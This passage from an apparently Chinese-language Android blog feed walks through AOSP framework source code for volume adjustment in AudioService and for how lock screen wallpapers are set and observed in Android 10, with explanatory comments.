class="keyword">if</span> (adjustVolume</span><br><span class="line">                &amp;&amp; (direction != AudioManager.ADJUST_SAME) &amp;&amp; (keyEventMode != VOL_ADJUST_END)) &#123;</span><br><span class="line">            mAudioHandler.removeMessages(MSG_UNMUTE_STREAM);</span><br><span class="line">            <span class="comment">// 处理静音调整</span></span><br><span class="line">            <span class="keyword">if</span> (isMuteAdjust) &#123;</span><br><span class="line">                <span class="type">boolean</span> state;</span><br><span class="line">                <span class="keyword">if</span> (direction == AudioManager.ADJUST_TOGGLE_MUTE) &#123;</span><br><span class="line">                    state = !streamState.mIsMuted;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    state = direction == AudioManager.ADJUST_MUTE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (streamTypeAlias == AudioSystem.STREAM_MUSIC) &#123;</span><br><span class="line">                    setSystemAudioMute(state);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="number">0</span>; stream &lt; mStreamStates.length; stream++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (streamTypeAlias == mStreamVolumeAlias[stream]) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!(readCameraSoundForced()</span><br><span class="line">                                    &amp;&amp; (mStreamStates[stream].getStreamType()</span><br><span class="line">                                        == AudioSystem.STREAM_SYSTEM_ENFORCED))) &#123;</span><br><span class="line">                            <span class="comment">// 这里获取当前流对应的VolumeStreamState实例，然后去调用mute方法</span></span><br><span class="line">                            <span class="comment">// 最终也会到AudioSystem去调用native方法</span></span><br><span class="line">                            mStreamStates[stream].mute(state);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((direction == AudioManager.ADJUST_RAISE) &amp;&amp;</span><br><span class="line">                    !checkSafeMediaVolume(streamTypeAlias, aliasIndex + step, device)) &#123;</span><br><span class="line">                <span class="comment">// 安全音量提示，音量增加的时候才会去检测</span></span><br><span class="line">                Log.e(TAG, <span class="string">&quot;adjustStreamVolume() safe volume index = &quot;</span> + oldIndex);</span><br><span class="line">                mVolumeController.postDisplaySafeVolumeWarning(flags);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!isFullVolumeDevice(device)</span><br><span class="line">                    &amp;&amp; (streamState.adjustIndex(direction * step, device, caller,</span><br><span class="line">                            hasModifyAudioSettings)</span><br><span class="line">                            || streamState.mIsMuted)) &#123;</span><br><span class="line">                <span class="comment">// Post message to set system volume (it in turn will post a</span></span><br><span class="line">                <span class="comment">// message to persist).</span></span><br><span class="line">                <span class="keyword">if</span> (streamState.mIsMuted) &#123;</span><br><span class="line">                    <span class="comment">// Unmute the stream if it was previously muted</span></span><br><span class="line">                    <span class="keyword">if</span> (direction == AudioManager.ADJUST_RAISE) &#123;</span><br><span class="line">                        <span class="comment">// unmute immediately for volume up</span></span><br><span class="line">                        streamState.mute(<span class="literal">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (direction == AudioManager.ADJUST_LOWER) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (mIsSingleVolume) &#123;</span><br><span class="line">                            sendMsg(mAudioHandler, MSG_UNMUTE_STREAM, SENDMSG_QUEUE,</span><br><span class="line">                                    streamTypeAlias, flags, <span class="literal">null</span>, UNMUTE_STREAM_DELAY);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 设置音量到底层</span></span><br><span class="line">                sendMsg(mAudioHandler,</span><br><span class="line">                        MSG_SET_DEVICE_VOLUME,</span><br><span class="line">                        SENDMSG_QUEUE,</span><br><span class="line">                        device,</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        streamState,</span><br><span class="line">                        <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newIndex</span> <span class="operator">=</span> mStreamStates[streamType].getIndex(device);</span><br><span class="line">            <span class="comment">// hdmi音量更新，这个不过多讲解</span></span><br><span class="line">            <span class="comment">// Check if volume update should be send to AVRCP</span></span><br><span class="line">            <span class="keyword">if</span> (streamTypeAlias == AudioSystem.STREAM_MUSIC</span><br><span class="line">                    &amp;&amp; AudioSystem.DEVICE_OUT_ALL_A2DP_SET.contains(device)</span><br><span class="line">                    &amp;&amp; (flags &amp; AudioManager.FLAG_BLUETOOTH_ABS_VOLUME) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (DEBUG_VOL) &#123;</span><br><span class="line">                    Log.d(TAG, <span class="string">&quot;adjustSreamVolume: postSetAvrcpAbsoluteVolumeIndex index=&quot;</span></span><br><span class="line">                            + newIndex + <span class="string">&quot;stream=&quot;</span> + streamType);</span><br><span class="line">                &#125;</span><br><span class="line">                mDeviceBroker.postSetAvrcpAbsoluteVolumeIndex(newIndex / <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Check if volume update should be send to Hearing Aid</span></span><br><span class="line">            <span class="keyword">if</span> (device == AudioSystem.DEVICE_OUT_HEARING_AID) &#123;</span><br><span class="line">                <span class="comment">// only modify the hearing aid attenuation when the stream to modify matches</span></span><br><span class="line">                <span class="comment">// the one expected by the hearing aid</span></span><br><span class="line">                <span class="keyword">if</span> (streamType == getHearingAidStreamType()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (DEBUG_VOL) &#123;</span><br><span class="line">                        Log.d(TAG, <span class="string">&quot;adjustSreamVolume postSetHearingAidVolumeIndex index=&quot;</span></span><br><span class="line">                                + newIndex + <span class="string">&quot; stream=&quot;</span> + streamType);</span><br><span class="line">                    &#125;</span><br><span class="line">                    mDeviceBroker.postSetHearingAidVolumeIndex(newIndex, streamType);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Check if volume update should be sent to Hdmi system audio.</span></span><br><span class="line">            <span class="keyword">if</span> (streamTypeAlias == AudioSystem.STREAM_MUSIC) &#123;</span><br><span class="line">                setSystemAudioVolume(oldIndex, newIndex, getStreamMaxVolume(streamType), flags);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">newIndex</span> <span class="operator">=</span> mStreamStates[streamType].getIndex(device);</span><br><span class="line">           <span class="keyword">if</span> (adjustVolume) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (mHdmiClientLock) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mHdmiManager != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// mHdmiCecSink true =&gt; mHdmiPlaybackClient != null</span></span><br><span class="line">                    <span class="keyword">if</span> (mHdmiCecSink</span><br><span class="line">                            &amp;&amp; mHdmiCecVolumeControlEnabled</span><br><span class="line">                            &amp;&amp; streamTypeAlias == AudioSystem.STREAM_MUSIC</span><br><span class="line">                            <span class="comment">// vol change on a full volume device</span></span><br><span class="line">                            &amp;&amp; isFullVolumeDevice(device)) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">keyCode</span> <span class="operator">=</span> KeyEvent.KEYCODE_UNKNOWN;</span><br><span class="line">                        <span class="keyword">switch</span> (direction) &#123;</span><br><span class="line">                            <span class="keyword">case</span> AudioManager.ADJUST_RAISE:</span><br><span class="line">                                keyCode = KeyEvent.KEYCODE_VOLUME_UP;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            <span class="keyword">case</span> AudioManager.ADJUST_LOWER:</span><br><span class="line">                                keyCode = KeyEvent.KEYCODE_VOLUME_DOWN;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            <span class="keyword">case</span> AudioManager.ADJUST_TOGGLE_MUTE:</span><br><span class="line">                                keyCode = KeyEvent.KEYCODE_VOLUME_MUTE;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (keyCode != KeyEvent.KEYCODE_UNKNOWN) &#123;</span><br><span class="line">                            <span class="keyword">final</span> <span class="type">long</span> <span class="variable">ident</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="keyword">final</span> <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> java.lang.System.currentTimeMillis();</span><br><span class="line">                                <span class="keyword">switch</span> (keyEventMode) &#123;</span><br><span class="line">                                    <span class="keyword">case</span> VOL_ADJUST_NORMAL:</span><br><span class="line">                                        mHdmiPlaybackClient.sendVolumeKeyEvent(keyCode, <span class="literal">true</span>);</span><br><span class="line">                                        mHdmiPlaybackClient.sendVolumeKeyEvent(keyCode, <span class="literal">false</span>);</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    <span class="keyword">case</span> VOL_ADJUST_START:</span><br><span class="line">                                        mHdmiPlaybackClient.sendVolumeKeyEvent(keyCode, <span class="literal">true</span>);</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    <span class="keyword">case</span> VOL_ADJUST_END:</span><br><span class="line">                                        mHdmiPlaybackClient.sendVolumeKeyEvent(keyCode, <span class="literal">false</span>);</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    <span class="keyword">default</span>:</span><br><span class="line">                                        Log.e(TAG, <span class="string">&quot;Invalid keyEventMode &quot;</span> + keyEventMode);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                                Binder.restoreCallingIdentity(ident);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (streamTypeAlias == AudioSystem.STREAM_MUSIC</span><br><span class="line">                            &amp;&amp; (oldIndex != newIndex || isMuteAdjust)) &#123;</span><br><span class="line">                        maybeSendSystemAudioStatusCommand(isMuteAdjust);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 通知外界音量发生变化 </span></span><br><span class="line">        sendVolumeUpdate(streamType, oldIndex, newIndex, flags, device);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Settings </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10.0 锁屏壁纸 LockscreenWallpaper</title>
      <link href="/2024/01/01/2024-01-01/"/>
      <url>/2024/01/01/2024-01-01/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h3 id="一、设置壁纸"><a href="#一、设置壁纸" class="headerlink" title="一、设置壁纸"></a>一、设置壁纸</h3><p>通过系统设置进行锁屏壁纸和桌面壁纸的设置。<br>Setting 部分的代码：<br><strong>packages/apps/WallpaperPicker2/src/com/android/wallpaper/module/DefaultWallpaperPersister.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">setStreamToWallpaperManagerCompat</span><span class="params">(InputStream inputStream, <span class="type">boolean</span> allowBackup,</span></span><br><span class="line"><span class="params">            <span class="type">int</span> whichWallpaper)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// whichWallpaper  // 壁纸类型</span></span><br><span class="line">            <span class="keyword">return</span> mWallpaperManagerCompat.setStream(inputStream, <span class="literal">null</span>, allowBackup,</span><br><span class="line">                    whichWallpaper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line"><span class="comment">//    int whichWallpaper;    // 壁纸类型</span></span><br><span class="line"><span class="comment">//    if (mDestination == DEST_HOME_SCREEN) &#123;    // 桌面壁纸</span></span><br><span class="line"><span class="comment">//        whichWallpaper = WallpaperManagerCompat.FLAG_SYSTEM;</span></span><br><span class="line"><span class="comment">//    &#125; else if (mDestination == DEST_LOCK_SCREEN) &#123;  // 锁屏壁纸</span></span><br><span class="line"><span class="comment">//        whichWallpaper = WallpaperManagerCompat.FLAG_LOCK;</span></span><br><span class="line"><span class="comment">//    &#125; else &#123; // DEST_BOTH    // 桌面壁纸 和 锁屏壁纸</span></span><br><span class="line"> <span class="comment">//       whichWallpaper = WallpaperManagerCompat.FLAG_SYSTEM</span></span><br><span class="line"><span class="comment">//                | WallpaperManagerCompat.FLAG_LOCK;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>mWallpaperManagerCompat 其实就是 WallpaperManagerCompatV16 的对象。<br><strong>packages/apps/WallpaperPicker2/src/com/android/wallpaper/compat/WallpaperManagerCompatV16.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">setStream</span><span class="params">(InputStream data, Rect visibleCropHint, <span class="type">boolean</span> allowBackup,</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> whichWallpaper)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    mWallpaperManager.setStream(data);</span><br><span class="line">    <span class="comment">// Return a value greater than zero to indicate success.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可知，壁纸的设置是通过 WallpaperManager 类来进行的。</p><h3 id="二、锁屏壁纸的显示"><a href="#二、锁屏壁纸的显示" class="headerlink" title="二、锁屏壁纸的显示"></a>二、锁屏壁纸的显示</h3><p>锁屏壁纸显示流程图：</p><p><img src="/images/20240101/20240101001.png"></p><p>上面应用程序设置完成了，下面就该进行壁纸显示了。<br>WallpaperManager#setStream()<br><strong>frameworks/base/core/java/android/app/WallpaperManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">setStream</span><span class="params">(InputStream bitmapData, Rect visibleCropHint,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> allowBackup, <span class="meta">@SetWallpaperFlags</span> <span class="type">int</span> which)</span></span><br><span class="line">                <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//sGlobals.mService即 WallpaperManagerService。</span></span><br><span class="line">        <span class="comment">// WallpaperManager 在 SystemServiceRegistry 实例化，</span></span><br><span class="line">        <span class="comment">// 过程中传入 WallpaperManagerService 的 binder 对象。   </span></span><br><span class="line">        <span class="type">ParcelFileDescriptor</span> <span class="variable">fd</span> <span class="operator">=</span> sGlobals.mService.setWallpaper(<span class="literal">null</span>,</span><br><span class="line">                mContext.getOpPackageName(), visibleCropHint, allowBackup,</span><br><span class="line">                result, which, completion, mContext.getUserId());</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 将壁纸copy一份并存储到对应目录，</span></span><br><span class="line">                <span class="comment">// 默认是/data/system/users/0/wallpaper(或wallpaper_lock),</span></span><br><span class="line">                <span class="comment">// 其中0是主用户的userId，支持多用户</span></span><br><span class="line">                fos = <span class="keyword">new</span> <span class="title class_">ParcelFileDescriptor</span>.AutoCloseOutputStream(fd);</span><br><span class="line">                copyStreamToWallpaperFile(bitmapData, fos);</span><br><span class="line">                fos.close();</span><br><span class="line">                completion.waitForCompletion();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                IoUtils.closeQuietly(fos);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e.rethrowFromSystemServer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result.getInt(EXTRA_NEW_WALLPAPER_ID, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里注意两个方法：sGlobals.mService.setWallpaper()和fos.close()。</p></blockquote><p>先看第一个 <strong>WallpaperManagerService#setWallpaper()</strong> 方法：<br><strong>frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">setWallpaper</span><span class="params">(String name, String callingPackage,</span></span><br><span class="line"><span class="params">        Rect cropHint, <span class="type">boolean</span> allowBackup, Bundle extras, <span class="type">int</span> which,</span></span><br><span class="line"><span class="params">        IWallpaperManagerCallback completion, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">    userId = ActivityManager.handleIncomingUser(getCallingPid(), getCallingUid(), userId,</span><br><span class="line">            <span class="literal">false</span> <span class="comment">/* all */</span>, <span class="literal">true</span> <span class="comment">/* full */</span>, <span class="string">&quot;changing wallpaper&quot;</span>, <span class="literal">null</span> <span class="comment">/* pkg */</span>);</span><br><span class="line">    <span class="comment">// 检查有没有设置壁纸的权限</span></span><br><span class="line">   checkPermission(android.Manifest.permission.SET_WALLPAPER);</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//调用setStream方法的时候参数which必须是正确的</span></span><br><span class="line">    <span class="keyword">if</span> ((which &amp; (FLAG_LOCK|FLAG_SYSTEM)) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Must specify a valid wallpaper category to set&quot;</span>;</span><br><span class="line">        Slog.e(TAG, msg);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Slog.v(TAG, <span class="string">&quot;setWallpaper which=0x&quot;</span> + Integer.toHexString(which));</span><br><span class="line">        WallpaperData wallpaper;</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//如果当前没有锁屏壁纸的话，并且是设置桌面壁纸即which == FLAG_SYSTEM，那么同时设置为锁屏壁纸</span></span><br><span class="line">        <span class="keyword">if</span> (which == FLAG_SYSTEM &amp;&amp; mLockWallpaperMap.get(userId) == <span class="literal">null</span>) &#123;</span><br><span class="line">            migrateSystemToLockWallpaperLocked(userId);</span><br><span class="line">        &#125;</span><br><span class="line">        wallpaper = getWallpaperSafeLocked(userId, which);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">ident</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// updateWallpaperBitmapLocked() 将创建一个文件描述符</span></span><br><span class="line">            <span class="type">ParcelFileDescriptor</span> <span class="variable">pfd</span> <span class="operator">=</span> updateWallpaperBitmapLocked(name, wallpaper, extras);</span><br><span class="line">            <span class="keyword">if</span> (pfd != <span class="literal">null</span>) &#123;</span><br><span class="line">                wallpaper.imageWallpaperPending = <span class="literal">true</span>;</span><br><span class="line">                wallpaper.whichPending = which;</span><br><span class="line">                wallpaper.setComplete = completion;</span><br><span class="line">                wallpaper.cropHint.set(cropHint);</span><br><span class="line">                wallpaper.allowBackup = allowBackup;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> pfd;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            Binder.restoreCallingIdentity(ident);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里再跟进一步，看下 <strong>updateWallpaperBitmapLocked()</strong> 方法：<br><strong>frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ParcelFileDescriptor <span class="title function_">updateWallpaperBitmapLocked</span><span class="params">(String name, WallpaperData wallpaper,</span></span><br><span class="line"><span class="params">        Bundle extras)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span>) name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 通过getWallpaperDir() 获取文件路径；这个方法值得注意：后面会讲到。</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> getWallpaperDir(wallpaper.userId);</span><br><span class="line">        <span class="keyword">if</span> (!dir.exists()) &#123;</span><br><span class="line">            dir.mkdir();</span><br><span class="line">            FileUtils.setPermissions(</span><br><span class="line">                    dir.getPath(),</span><br><span class="line">                    FileUtils.S_IRWXU|FileUtils.S_IRWXG|FileUtils.S_IXOTH,</span><br><span class="line">                    -<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建一个文件描述符，并返回。</span></span><br><span class="line">        <span class="type">ParcelFileDescriptor</span> <span class="variable">fd</span> <span class="operator">=</span> ParcelFileDescriptor.open(wallpaper.wallpaperFile,</span><br><span class="line">                MODE_CREATE|MODE_READ_WRITE|MODE_TRUNCATE);</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">        <span class="keyword">return</span> fd;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">        Slog.w(TAG, <span class="string">&quot;Error setting wallpaper&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里再看 <strong>fos.close()</strong> ，这个方法本身没什么可以看的，就是 FileOutputStream  文件字节输出流结束。但是这里涉及到了 WallpaperManagerService 的一个内部类 WallpaperObserver，通过名字我们就能知道它是一个观察者。<br><strong>WallpaperObserver 初始化</strong>：在 WallpaperManagerService 初始化时，会调用 systemReady() 通过getWallpaperSafeLocked()方法初始化 WallpaperData，而这个 WallpaperData 中有个变量 wallpaperObserver ，也在开机时服务初始化， systemReady() 中调用 switchUser() 执行了 wallpaperObserver.startWatching()。<br><strong>WallpaperObserver 这个内部类的作用</strong>：观察壁纸的变化并通知所有 IWallpaperServiceCallbacks 壁纸已经改变。 CREATE 在没有设置壁纸时触发，并且是第一次创建。每次更改壁纸时都会触发 CLOSE_WRITE，这也是关注 <strong>fos.close()</strong> 的原因。<br>所以文件的变化触发 WallpaperObserver 的 onEvent() ：<br><strong>frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEvent</span><span class="params">(<span class="type">int</span> event, String path)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (path == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">moved</span> <span class="operator">=</span> (event == MOVED_TO);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">written</span> <span class="operator">=</span> (event == CLOSE_WRITE || moved);</span><br><span class="line">    <span class="comment">// 获取发生了 CLOSE_WRITE 事件的文件路径</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">File</span> <span class="variable">changedFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(mWallpaperDir, path);</span><br><span class="line">    <span class="comment">// System and system+lock changes happen on the system wallpaper input file;</span></span><br><span class="line">    <span class="comment">// lock-only changes happen on the dedicated lock wallpaper input file</span></span><br><span class="line">    <span class="comment">// 用于判断事件是不是这个事件发生的。</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">sysWallpaperChanged</span> <span class="operator">=</span> (mWallpaperFile.equals(changedFile));</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">lockWallpaperChanged</span> <span class="operator">=</span> (mWallpaperLockFile.equals(changedFile));</span><br><span class="line">    <span class="type">int</span> <span class="variable">notifyColorsWhich</span> <span class="operator">=</span> <span 